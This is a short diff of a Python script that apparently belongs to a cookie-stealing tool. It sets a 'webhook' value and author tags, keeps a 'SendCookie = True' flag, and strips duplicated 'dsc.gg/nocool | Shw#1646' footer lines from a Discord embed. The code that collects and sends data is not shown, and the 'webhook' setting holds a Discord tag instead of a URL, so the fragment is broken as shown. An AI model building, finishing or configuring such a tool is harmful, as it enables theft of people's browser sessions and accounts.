@@ -2,10 +2,10 @@ import json, requests,random,string,time
 from random import randint
 
 # - stuff to fill out
-webhook = 'Shw#1646' Your Discord Webhook Goes here
-name = 'Shw#1646' - your name goes here 
-madeby = 'Shw#1646' - You can change my discord name if you want but then your a skid
-delay = 0 - Keep it to 0
+webhook = 'Shw#1646'
+name = 'Shw#1646'
+madeby = 'Shw#1646'
+delay = 0
 
 # - true or false
 SendCookie = True
@@ -96,12 +96,6 @@ def post():
       "color": 15064798,
       "footer": {
         "text": "dsc.gg/nocool | Shw#1646"
-          "text": "dsc.gg/nocool | Shw#1646"
-          "text": "dsc.gg/nocool | Shw#1646"
-           "text": "dsc.gg/nocool | Shw#1646"
-     "text": "dsc.gg/nocool | Shw#1646"
- "text": "dsc.gg/nocool | Shw#1646"
- "text": "dsc.gg/nocool | Shw#1646"
       },
       "image": {
         "url": "https://media.discordapp.net/attachments/818904708940693513/1028385554242486333/unknown.png?width=675&height=675"
